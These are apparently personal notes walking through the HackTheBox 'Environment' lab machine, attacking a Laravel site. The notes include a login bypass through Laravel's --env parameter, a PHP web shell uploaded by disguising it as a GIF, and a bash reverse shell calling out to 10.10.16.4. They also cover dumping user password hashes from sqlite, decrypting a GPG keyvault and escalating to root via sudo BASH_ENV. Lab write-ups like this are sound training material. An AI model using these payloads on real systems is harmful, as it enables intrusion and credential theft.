start with nmap -sV -sC -vv -oA nmap/environment ip address

add ip address environment.htb to /etc/hosts

going to the webpage and using wappalyzer, we see that its using larval

look into the source page and see if we can find anykind of version for it 
look into burpsuite and see if we can find any kind of version for it

in burpsuite we see the XFRS-Token and the larval session

run nuclei -target http://environment.htb

look at 404 pages and go tyhrough 0xdf error message to find frameworks

go to a random nonexistant page and look at the page and source code and see if any match on the 0xdf error messages

enter test@test.com on the email to subscribe/join then intercept with burpsuite


run a gobuster: "gobuster dir -u http://environment.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -b 403,404"

go to one of the pages that come up

look for larval release notes
look for larval CVE vulnerabilities details

look for https://github.com/Nyamort/CVE-2024-52301 

http://environment.htb/?--env=dev

also try to do system code 
http://environment.htb/?--env=<?php echo "test"?>

from the gobosuter, go to the login page and try to get rid of the email or password paramater and try to cause an error message

we can resent the log information and change the "remember=false" to remember ="test"

change the post from /login to /login?--env=preprod

once the request is forwarded, we are logged in, add ?--env=preprod to the end of the url: "http://environment.htb/management/dashboard?--env=preprod"

when trying to go to the phpinfo, see the path and change the url to http://environment.htb/management/info?--env=preprod


once on the php info page, search for passwords/password

going to the profile page, save the image 

create a shell.php file with <?php system($_REQUEST['cmd]); ?>

try to upload the shell.php file as the image

intercept the traffic

send it over to repeater 
send it and see if we get any errors,

if we get errors,

change the Content-Type from application/x-php to image/gif

we can change the extension from php to gif in burpsuite repeater and send it over 

change the magic bytes, so try and add GIF89a;<?php system($_REQUEST['cmd]); ?>

it uploaded, try to add the extension.php to the filename shell.gif to make it shell.gif.php, or php5, or other php versions

try to access the file path that had successful upload

go back to the Larval CVE Details and look at the image validation

search this https://www.miggo.io/vulnerability-database/cve/CVE-2025-27515

add a . to make it shell.gif.php.

do an intercept on the file path 

if you get the GIF89a;, in the response 

do cmd=id and we get code execution

change cmd=id to cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.4/9001 0>&1' make sure to url encode it 

start a net cat listener with nc -lvnp 9001

in the reverse shell do 
 <!-- python3 -c 'import pty;pty.spawn("/bin/bash")' -->

do "CTRL + z"

do "stty raw -echo;fg"

hit enter * 2

export TERM=xterm

to change the rows and cols 

on local machine do stty -a

on the reverse shell machine 

do stty rows # cols #

on the server, look for the database

cd to /app or the root machine 

do "find . | grep sql"
cd into database 

sqlite3 database.sqlite .dump

go into the database sqlite database.sqlite

select email, password from users;

going to home directory and then going to the hish directory, we get the user.txt 

and going into the backup directory

cd ../
then do ls -la for hidden files 

cd into .gnupg

cd ../ into home 

cp -r .gnupg/ /dev/shm/
gpg -d --home /dev/shm/.gnupg backup/keyvault.gpg

we do an ssh for hish@environment.htb

enter password

do sudo -l for allows and dissalows

go explore what we are allowed to do with our privilege

created a vi /dev/shm/pwn.sh 
added !#/bin/bash

add bash to the file 

chmod +x to the file 

sudo BASH_ENV=/dev/shm/pwn.sh /usr/bin/systeminfo

